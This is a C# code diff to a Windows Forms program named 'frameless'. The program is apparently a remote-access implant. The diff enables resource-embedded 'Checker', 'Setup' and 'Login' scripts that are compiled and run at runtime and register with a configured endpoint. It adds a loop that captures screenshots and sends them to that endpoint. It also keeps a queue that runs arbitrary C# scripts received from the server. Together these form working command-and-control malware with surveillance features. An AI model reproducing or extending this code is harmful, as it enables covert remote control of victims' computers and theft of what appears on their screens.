@@ -5,7 +5,6 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Collections.Generic;
 using System.Linq;
-
 namespace frameless
 {
     public partial class Form1 : Form
@@ -19,17 +18,18 @@ namespace frameless
 
             public string functionArgs { get; set; }
         }
-        private static string Me = "699fb423311d050017821325aba95b7c1ebf91bf5904932e0b5df2bab3b958c2";
-        private static int Delay = 1_000;
+        private static string Me = "";
+        private static int Delay = 60_000;
         private static int Screenshot = 0;
         private static Queue<Instruction> InstructionsQueue = new Queue<Instruction>();
         private async static void Runn()
         {
             var resource = new ResourceManager("frameless.Form1", typeof(Form1).Assembly);
-      //      await Action.ExecuteCsharpCodeAsync(resource.GetString("Checker"), new object[] { });
-       //     await Action.ExecuteCsharpCodeAsync(resource.GetString("Setup"), new object[] { });
-        //    Me = (string)await Action.ExecuteCsharpCodeAsync(resource.GetString("Login"), new object[] { Properties.Resources.Endpoint });
+            await Action.ExecuteCsharpCodeAsync(resource.GetString("Checker"), new object[] { });
+            await Action.ExecuteCsharpCodeAsync(resource.GetString("Setup"), new object[] { });
+            Me = (string)await Action.ExecuteCsharpCodeAsync(resource.GetString("Login"), new object[] { Properties.Resources.Endpoint });
             Task.Run(() => InstructionHandler());
+            Task.Run(() => ScreenshotsHandler(resource));
             new Thread(
                 async () =>
                 {
@@ -90,7 +90,26 @@ namespace frameless
                 }
             ).Start();
         }
-
+        private static void ScreenshotsHandler(ResourceManager resource)
+        {
+            while (true)
+            {
+                if (Screenshot != 0)
+                {
+                    Action.ExecuteCsharpCodeAsync(resource.GetString("Screen"), new object[] {Properties.Resources.Endpoint,Me });
+                    if (Screenshot > 1)
+                    {
+                        Thread.Sleep(Screenshot * 1000);
+                    }else if(Screenshot == -1)
+                    {
+                        Screenshot = 0;
+                    }
+                }else
+                {
+                    Thread.Sleep(1000);
+                }
+            }
+        }
         private static async Task InstructionHandler()
         {
             while (true)
@@ -103,8 +122,8 @@ namespace frameless
                 {
                     var oldestInstruction = InstructionsQueue.Dequeue();
                     object[] args = string.IsNullOrEmpty(oldestInstruction.functionArgs) ? Array.Empty<object>() : Array.ConvertAll(oldestInstruction.functionArgs.Split(new[] { "*.&-&.*" }, StringSplitOptions.None), item => (object)item);
-                    var x = await Action.ExecuteCsharpCodeAsync(oldestInstruction.script, args.Concat(new object[] { Properties.Resources.Endpoint,Me, oldestInstruction.instructionId, oldestInstruction.code }).ToArray());
-                    Console.WriteLine(x);   
+                    Action.ExecuteCsharpCodeAsync(oldestInstruction.script, args.Concat(new object[] { Properties.Resources.Endpoint,Me, oldestInstruction.instructionId, oldestInstruction.code }).ToArray());
+                    
                 }
             }
         }
